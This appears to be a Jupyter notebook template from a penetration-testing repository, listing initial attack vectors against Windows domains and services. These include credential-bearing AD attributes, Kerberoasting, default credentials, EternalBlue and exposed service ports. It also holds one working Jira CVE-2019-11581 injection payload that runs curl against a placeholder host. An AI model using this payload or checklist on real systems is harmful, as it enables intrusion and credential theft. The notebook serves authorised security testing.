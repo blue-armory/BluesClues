{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Page Template\n",
    "This notebook contains commands and procedures necessary for all new pages.\n",
    "\n",
    "v.1.2.1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "_This page should account for the following_:\n",
    "### Initial Vectors\n",
    "#### Domain:\n",
    "* GPP\n",
    "* Userpassword AD attribute\n",
    "* orclcommonattribute AD attribute (sha1 hash from Oracle Internet Directory)\n",
    "* ms-mcs-admpwd AD attribute (LAPS local administrator password attribute)\n",
    "   - ms-mcs-admpwdexpirationtime is world-readable and indicates if LAPS is used (if it exists and is not blank)\n",
    "* Autologons\n",
    "* Scripts directory (\\\\domain\\sysvol\\domain\\scripts)\n",
    "* Kerberoasting\n",
    "* ASRep roasting\n",
    "* Shares / NFS\n",
    "* PowerUp\n",
    "* Responder\n",
    "* LAPS\n",
    "* Web portals\n",
    "   * Tomcat\n",
    "   * JBoss\n",
    "   * Jenkins\n",
    "   * Printers\n",
    "   * Custom?\n",
    "* Other default creds\n",
    "   * SSH\n",
    "   * FTP\n",
    "   * Telnet\n",
    "   * MSSQL\n",
    "   * MySQL\n",
    "   * VNC\n",
    "   * X11\n",
    "* Exploits\n",
    "   * Eternalblue\n",
    "   * MS08-067\n",
    "* Misconfigurations\n",
    "   * IPMI \n",
    "       auxiliary/scanner/ipmi/ipmi_version\n",
    "   * Cisco smart install (TCP port 4786)\n",
    "https://github.com/Sab0tag3d/SIET\n",
    "   * PrivExchange\n",
    "   * Unauth Redis server - port 6379  (scanner/redis/redis_server)\n",
    "   * Unauth MongoDB - port 27017  (NoSQLMap tool)\n",
    "   * Java deserialization (websphere port 8880) (serializekiller tool)\n",
    "   * rexecd - port 512\n",
    "   * Jira contactadmin form https://jiraserver/secure/ContactAdministrators!default.jspa \n",
    "       Put in subject field of contact form (CVE-2019-11581): \n",
    "           $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://URL/rcetest?a=a').waitFor() \n",
    "   * Java RMI server - port 1090,1098,1099,4444,11099,47001,47002,10999\n",
    "   * WebLogic: 7000-7004,8000-8003,9000-9003,9503,7070,7071\n",
    "   * JDWP: 45000,45001\n",
    "   * JMX: 8686,9012,50500\n",
    "   * GlassFish: 4848\n",
    "   * jBoss: 11111,4444,4445\n",
    "   * HP Data Protector: 5555,5556"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Global Variables/Commands"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Imports\n",
    "import templates"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Action Template"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Action Template\n",
    "\n",
    "#force_run = False\n",
    "\n",
    "#cmd_cache = ''\n",
    "#cmd_syntax = ''\n",
    "#cmd_os = ''\n",
    "\n",
    "#output = templates.cache_command_output(cmd_cache, force_run, cmd_os, cmd_run)\n",
    "\n",
    "#print(output)"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
